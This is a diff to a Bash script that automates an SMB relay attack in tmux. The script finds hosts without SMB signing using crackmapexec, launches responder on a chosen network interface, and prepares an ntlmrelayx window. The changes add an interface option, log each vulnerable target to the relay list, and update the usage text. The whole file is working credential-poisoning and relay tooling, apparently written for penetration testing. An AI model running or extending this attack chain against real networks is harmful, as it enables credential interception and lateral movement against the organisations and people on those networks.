@@ -25,6 +25,9 @@ YELLOW='\033[0;33m'
 BLUE='\033[0;34m'
 NC='\033[0m' # No Color
 
+# Network interface (configurable)
+network_interface="eth0"
+
 # Print help
 print_help() {
     echo -e "${BLUE}Usage: $0 [-f TARGET_FILE] [-h]${NC}"
@@ -47,7 +50,10 @@ run_crackmapexec() {
     if [[ ! -f "${TARGET_SMB_FILE}" ]]; then
         echo -e "[*] ${BLUE}Commence checking on targets with misconfigured smb signing${NC}"
         echo -e "[*] ${GREEN}Generating list of misconfigured smb signing targets in this output file ${TARGET_SMB_FILE}${NC} via crackmapexec..."
-        crackmapexec smb --gen-relay-list "${TARGET_SMB_FILE}" "${TARGET_FILE}" | grep "signing:False"
+        crackmapexec smb --gen-relay-list "${TARGET_SMB_FILE}" "${TARGET_FILE}" | grep "signing:False" | while read -r line; do
+            echo -e "${YELLOW}[!] Misconfigured target: ${line}${NC}"
+            echo "$line" >> "${TARGET_SMB_FILE}"
+        done
     fi
 }
 
@@ -82,7 +88,7 @@ run_smb_relay_attack() {
     tmux rename-window $window1
     echo -e "[*] ${YELLOW}Running responder on window ${window1}...${NC}"
     # run the responder
-    tmux send-keys "responder -I eth0" C-m
+    tmux send-keys "responder -I ${network_interface}" C-m
     # add ntlmrelayx window
     echo -e "[+] ${GREEN}Creating window named ${window2}...${NC}"
     tmux new-window
@@ -94,7 +100,7 @@ run_smb_relay_attack() {
     tmux -CC attach-session -t $session_name
 }
 
-while getopts "f:h" opt; do
+while getopts "f:hi:" opt; do
     case $opt in
     f)
         TARGET_FILE="$OPTARG"
@@ -102,6 +108,9 @@ while getopts "f:h" opt; do
     h)
         print_help
         exit 0
+        ;;
+    i)
+        network_interface="$OPTARG"
         ;;
     \?)
         echo -e "${RED}[!] Invalid option: -$OPTARG${NC}" >&2
@@ -122,7 +131,7 @@ if  tmux list-session | grep -qE "^$session_name:" > /dev/null; then
 else
     # Check required arguments
     if [ -z "${TARGET_FILE}" ]; then
-        echo -e "${RED}[!] Usage: ./$0 [-f TARGET_FILE]${NC}"
+        echo -e "${RED}[!] Usage: ./$0 [-f TARGET_FILE] [-i NETWORK_INTERFACE]${NC}"
         exit 1
     fi
     # Check if required tools are installed
